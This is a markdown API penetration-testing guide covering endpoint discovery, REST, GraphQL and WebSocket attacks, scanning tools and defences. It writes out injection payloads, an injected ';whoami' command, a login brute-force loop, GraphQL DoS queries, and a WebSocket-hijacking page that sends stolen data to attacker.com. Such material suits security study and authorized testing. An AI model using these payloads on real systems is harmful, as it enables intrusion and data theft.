# API Security Testing - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [API Discovery & Reconnaissance](#api-discovery--reconnaissance)
3. [REST API Testing](#rest-api-testing)
4. [GraphQL Testing](#graphql-testing)
5. [WebSocket Testing](#websocket-testing)
6. [API-Specific Vulnerabilities](#api-specific-vulnerabilities)
7. [Scanning Tools](#scanning-tools)
8. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

APIs (Application Programming Interfaces) are critical components of modern web applications. They often handle sensitive operations and data, making them prime targets for attackers.

**Impact of API Vulnerabilities**:
- Data breaches
- Unauthorized access
- Account takeover
- Business logic bypass
- Denial of Service
- Mass assignment
- Excessive data exposure

**Common API Types**:
- REST (JSON/XML)
- GraphQL
- SOAP
- WebSocket
- gRPC

---

## API Discovery & Reconnaissance

### 1. Identify API Endpoints

**Common Patterns**:
```
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/graph
/ws
/websocket
/v1/
/v2/
```

**Discovery Methods**:

**A. Browse Application**:
```javascript
// Check Network tab in DevTools
// Look for XHR/Fetch requests
// Example: /api/users, /api/products
```

**B. JavaScript Analysis**:
```bash
# Extract API endpoints from JS files
wget https://target.com/main.js
grep -oP '(/api/[a-zA-Z0-9/_-]+)' main.js | sort -u

# Or use tools
python3 LinkFinder.py -i https://target.com/main.js -o results.html
```

**C. Directory Bruteforce**:
```bash
# ffuf
ffuf -u https://target.com/api/FUZZ \
  -w /usr/share/wordlists/api-endpoints.txt \
  -mc 200,301,302,401,403

# gobuster
gobuster dir -u https://target.com/api/ \
  -w /usr/share/wordlists/api-endpoints.txt \
  -s "200,204,301,302,307,401,403,405"
```

**D. Swagger/OpenAPI Documentation**:
```
https://target.com/swagger
https://target.com/api-docs
https://target.com/swagger-ui
https://target.com/api/swagger.json
https://target.com/openapi.json
https://target.com/docs
https://target.com/api/docs
```

### 2. API Documentation Parsing

**Extract from Swagger**:
```bash
# Download swagger.json
curl https://target.com/api/swagger.json > swagger.json

# Parse endpoints
cat swagger.json | jq '.paths | keys[]'

# Extract parameters
cat swagger.json | jq '.paths[][] | .parameters[]? | .name' | sort -u
```

### 3. Identify API Version

**Test Multiple Versions**:
```bash
curl https://target.com/api/v1/users
curl https://target.com/api/v2/users
curl https://target.com/api/v3/users

# Old versions may have vulnerabilities
# Try: v0, v1, v2, v3, beta, dev, test
```

---

## REST API Testing

### 1. HTTP Methods Testing

**Test All Methods**:
```bash
# GET
curl -X GET https://target.com/api/users/1

# POST
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}'

# PUT
curl -X PUT https://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"name":"updated"}'

# DELETE
curl -X DELETE https://target.com/api/users/1

# PATCH
curl -X PATCH https://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"name":"patched"}'

# OPTIONS (check allowed methods)
curl -X OPTIONS https://target.com/api/users -I

# HEAD
curl -X HEAD https://target.com/api/users -I
```

**Unexpected Methods**:
```bash
# Try unauthorized methods
curl -X DELETE https://target.com/api/users/1
# If 200/204 instead of 403 → method not restricted

# Method override
curl -X POST https://target.com/api/users/1 \
  -H "X-HTTP-Method-Override: DELETE"
curl -X POST https://target.com/api/users/1 \
  -H "X-Method-Override: PUT"
```

### 2. Authentication & Authorization Testing

**No Authentication**:
```bash
# Try without auth header
curl https://target.com/api/users

# If 200 OK → missing authentication
```

**Broken Authentication**:
```bash
# Empty token
curl https://target.com/api/users \
  -H "Authorization: Bearer "

# Invalid token
curl https://target.com/api/users \
  -H "Authorization: Bearer invalid"

# Null token
curl https://target.com/api/users \
  -H "Authorization: Bearer null"
```

**BOLA (Broken Object Level Authorization)**:
```bash
# User A's token
TOKEN_A="eyJhbGc..."

# Access User B's data
curl https://target.com/api/users/2 \
  -H "Authorization: Bearer $TOKEN_A"

# If 200 OK → BOLA vulnerable (IDOR in APIs)
```

### 3. Mass Assignment

**Attack**:
```bash
# Normal request
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@example.com"}'

# Add extra parameters
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@example.com","role":"admin","isAdmin":true}'

# If role/admin assigned → Mass Assignment vulnerable
```

**Test Common Parameters**:
```json
{
  "role": "admin",
  "isAdmin": true,
  "is_admin": true,
  "admin": true,
  "privilege": "admin",
  "permissions": ["admin"],
  "verified": true,
  "active": true,
  "enabled": true
}
```

### 4. Parameter Pollution

**Attack**:
```bash
# Single parameter
curl "https://target.com/api/users?id=1"

# Duplicate parameters
curl "https://target.com/api/users?id=1&id=2"
curl "https://target.com/api/users?id=1&id=2&id=3"

# Array syntax
curl "https://target.com/api/users?id[]=1&id[]=2"

# Different parser behavior:
# - First value: id=1
# - Last value: id=2
# - Array: [1, 2]
# - Concatenated: 1,2
```

### 5. Excessive Data Exposure

**Check Responses**:
```bash
curl https://target.com/api/users/1 | jq

# Look for sensitive data in response:
# - Passwords (even hashed)
# - API keys
# - Internal IDs
# - Email addresses
# - Phone numbers
# - SSN, credit cards
```

**Response Filtering**:
```bash
# Request specific fields
curl "https://target.com/api/users/1?fields=name,email"

# Try requesting sensitive fields
curl "https://target.com/api/users/1?fields=password,api_key,ssn"
```

### 6. Rate Limiting Testing

**Brute Force**:
```bash
# Check if rate limiting exists
for i in {1..1000}; do
    curl https://target.com/api/login \
      -d "username=admin&password=test$i"
done

# If no 429 (Too Many Requests) → no rate limiting
```

**Test Per**:
- IP address
- User account
- API key
- Session

### 7. Injection Attacks

**SQL Injection**:
```bash
curl "https://target.com/api/users?id=1' OR '1'='1"
curl -X POST https://target.com/api/search \
  -d '{"query":"admin'\'' OR '\''1'\''='\''1"}'
```

**NoSQL Injection**:
```bash
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

**Command Injection**:
```bash
curl -X POST https://target.com/api/ping \
  -d '{"host":"8.8.8.8; whoami"}'
```

**XSS**:
```bash
curl -X POST https://target.com/api/comments \
  -d '{"comment":"<script>alert(1)</script>"}'

# Check if reflected in web UI
```

---

## GraphQL Testing

### 1. GraphQL Discovery

**Common Endpoints**:
```
/graphql
/graphiql
/api/graphql
/v1/graphql
/console
/query
```

**Detection**:
```bash
# Send GraphQL query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'

# If valid response → GraphQL endpoint
```

### 2. Introspection

**Full Schema Introspection**:
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Quick Introspection**:
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | jq
```

### 3. GraphQL-Specific Attacks

**A. Query Depth Attack (DoS)**:
```graphql
query {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  # ... 100 levels deep
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**B. Batch Queries (DoS)**:
```graphql
query {
  q1: users { id name }
  q2: users { id name }
  q3: users { id name }
  # ... 1000 times
}
```

**C. Aliases Abuse**:
```graphql
query {
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  # ... extract all users
}
```

**D. Field Duplication**:
```graphql
query {
  user(id: 1) {
    name name name name name
    email email email email email
    # ... 1000 times
  }
}
```

**E. IDOR in GraphQL**:
```graphql
query {
  user(id: 1) {
    id
    name
    email
    ssn      # Sensitive field
  }
}

# Try different IDs
query {
  user(id: 2) {
    id
    name
    email
    ssn
  }
}
```

**F. Mutation Testing**:
```graphql
# Test unauthorized mutations
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUser(id: 1, role: "admin") {
    id
    role
  }
}
```

### 4. GraphQL Tools

**GraphQL Voyager**:
```bash
# Visualize GraphQL schema
# Open https://graphql-kit.com/graphql-voyager/
# Paste introspection result
```

**InQL Scanner (Burp Extension)**:
```
Install: Extender → BApp Store → InQL Scanner
Usage:
1. Proxy GraphQL traffic through Burp
2. InQL automatically detects GraphQL
3. Extracts schema
4. Generates queries
5. Tests for vulnerabilities
```

**GraphQL Cop**:
```bash
# Install
pip3 install graphql-cop

# Scan
graphql-cop -t https://target.com/graphql

# With authentication
graphql-cop -t https://target.com/graphql \
  -H "Authorization: Bearer TOKEN"
```

---

## WebSocket Testing

### 1. WebSocket Discovery

**Common Endpoints**:
```
/ws
/websocket
/socket
/socket.io
/chat
```

**Detection in Burp**:
```
Proxy → WebSockets history
Look for "Upgrade: websocket" header
```

### 2. WebSocket Vulnerabilities

**A. No Authentication**:
```javascript
// Test connection without auth
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = () => {
    ws.send(JSON.stringify({action: 'getMessages'}));
};

ws.onmessage = (event) => {
    console.log('Received:', event.data);
};
```

**B. Authorization Bypass**:
```javascript
// Try accessing other users' data
ws.send(JSON.stringify({
    action: 'subscribe',
    userId: 123  // Different user ID
}));
```

**C. Message Injection**:
```javascript
// XSS in WebSocket messages
ws.send(JSON.stringify({
    message: '<script>alert(document.cookie)</script>'
}));

// Command injection
ws.send(JSON.stringify({
    command: 'ping',
    host: '8.8.8.8; whoami'
}));
```

**D. CSWSH (Cross-Site WebSocket Hijacking)**:
```html
<!-- Attacker's page -->
<script>
const ws = new WebSocket('wss://vulnerable.com/ws');

ws.onopen = () => {
    ws.send(JSON.stringify({action: 'getPrivateData'}));
};

ws.onmessage = (event) => {
    // Exfiltrate data
    fetch('https://attacker.com/log', {
        method: 'POST',
        body: event.data
    });
};
</script>
```

### 3. WebSocket Testing Tools

**wscat**:
```bash
# Install
npm install -g wscat

# Connect
wscat -c wss://target.com/ws

# With headers
wscat -c wss://target.com/ws \
  -H "Authorization: Bearer TOKEN"

# Send message
> {"action":"subscribe","channel":"admin"}
```

**Burp Suite**:
```
1. Proxy → WebSockets history
2. Right-click message → Send to Repeater
3. Modify and resend
4. Test for injection, authorization bypass
```

---

## API-Specific Vulnerabilities

### 1. API Key Exposure

**Check For**:
```bash
# In responses
curl https://target.com/api/config | grep -i "api_key\|apikey\|api-key"

# In JavaScript
curl https://target.com/app.js | grep -oP 'api[_-]?key["\']?\s*[:=]\s*["\']?\K[a-zA-Z0-9_-]+'

# In mobile apps (decompiled)
# Search for: API_KEY, apiKey, api_secret
```

### 2. Insecure Direct Object References (IDOR)

**Predictable IDs**:
```bash
# Sequential
curl https://target.com/api/orders/1001
curl https://target.com/api/orders/1002
curl https://target.com/api/orders/1003

# UUID (but still IDOR if no auth)
curl https://target.com/api/documents/550e8400-e29b-41d4-a716-446655440000
```

### 3. Lack of Resources & Rate Limiting

**Resource Exhaustion**:
```bash
# Request large dataset
curl "https://target.com/api/users?limit=999999"

# Expensive operations
curl "https://target.com/api/reports?startDate=2000-01-01&endDate=2025-12-31"
```

### 4. Security Misconfiguration

**Verbose Errors**:
```bash
curl https://target.com/api/users/invalid

# Check for:
# - Stack traces
# - Database errors
# - File paths
# - Framework versions
```

**Debug Endpoints**:
```
/api/debug
/api/test
/api/dev
/api/internal
```

### 5. Injection Attacks

**All standard injections apply**:
- SQL Injection
- NoSQL Injection
- Command Injection
- XXE (for XML APIs)
- XSS (in responses)
- LDAP Injection
- Template Injection

---

## Scanning Tools

### 1. Postman

**Usage**:
```
1. Import API collection
2. Set up environment variables
3. Test each endpoint
4. Write test scripts
5. Run collection
```

**Test Scripts**:
```javascript
// Check response status
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

// Check for sensitive data
pm.test("No password in response", function () {
    pm.expect(pm.response.text()).to.not.include("password");
});
```

### 2. Burp Suite

**Extensions**:
- Autorize (API authorization testing)
- InQL Scanner (GraphQL)
- JSON Web Tokens
- Param Miner (Hidden parameters)

### 3. OWASP ZAP

**API Scan**:
```bash
# Import OpenAPI definition
zap-cli open-api -f swagger.json

# Active scan
zap-cli active-scan https://target.com/api/

# Spider API
zap-cli spider https://target.com/api/
```

### 4. Arjun (Parameter Discovery)

```bash
# Install
git clone https://github.com/s0md3v/Arjun
cd Arjun
pip3 install -r requirements.txt

# Scan
python3 arjun.py -u https://target.com/api/users

# With authentication
python3 arjun.py -u https://target.com/api/users \
  -H "Authorization: Bearer TOKEN"

# POST request
python3 arjun.py -u https://target.com/api/users \
  -m POST
```

### 5. Kiterunner (API Endpoint Discovery)

```bash
# Install
git clone https://github.com/assetnote/kiterunner
cd kiterunner
make build

# Scan
./kr scan https://target.com -w routes-large.kite

# With authentication
./kr scan https://target.com -w routes-large.kite \
  -H "Authorization: Bearer TOKEN"
```

### 6. APICheck

```bash
# Docker
docker run -it --rm cr.fluentattacks.com/apicheck/apicheck

# Test API
apicheck run https://target.com/api/
```

---

## Prevention & Mitigation

### 1. Authentication & Authorization

```javascript
// Require authentication for all endpoints
app.use('/api', requireAuth);

// Check ownership
app.get('/api/orders/:id', (req, res) => {
    const order = getOrder(req.params.id);

    if (order.userId !== req.user.id && !req.user.isAdmin) {
        return res.status(403).json({error: 'Forbidden'});
    }

    res.json(order);
});
```

### 2. Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/api/', limiter);
```

### 3. Input Validation

```javascript
const { body, validationResult } = require('express-validator');

app.post('/api/users',
    body('email').isEmail(),
    body('age').isInt({ min: 0, max: 120 }),
    (req, res) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }
        // Process request
    }
);
```

### 4. Response Filtering

```javascript
// Don't expose sensitive fields
const sanitizeUser = (user) => {
    const { password, apiKey, ...safe } = user;
    return safe;
};

app.get('/api/users/:id', (req, res) => {
    const user = getUser(req.params.id);
    res.json(sanitizeUser(user));
});
```

### 5. GraphQL Protections

```javascript
// Depth limiting
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [depthLimit(5)]
});

// Query complexity
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const validationRules = [
    createComplexityLimitRule(1000)
];
```

### Security Checklist

- [ ] Authentication required for all endpoints
- [ ] Authorization checks on every request
- [ ] Rate limiting implemented
- [ ] Input validation on all parameters
- [ ] Output filtering (no sensitive data exposure)
- [ ] HTTPS only
- [ ] CORS properly configured
- [ ] No verbose error messages
- [ ] API versioning
- [ ] GraphQL depth/complexity limiting
- [ ] WebSocket authentication & authorization
- [ ] Security headers (HSTS, CSP, etc.)
- [ ] Regular security audits
- [ ] API documentation secured
- [ ] Logging and monitoring

---

**Additional Resources**:
- OWASP API Security Top 10
- OWASP API Security Project
- PortSwigger API Testing
- HackTricks - API Pentesting
- GraphQL Security Best Practices
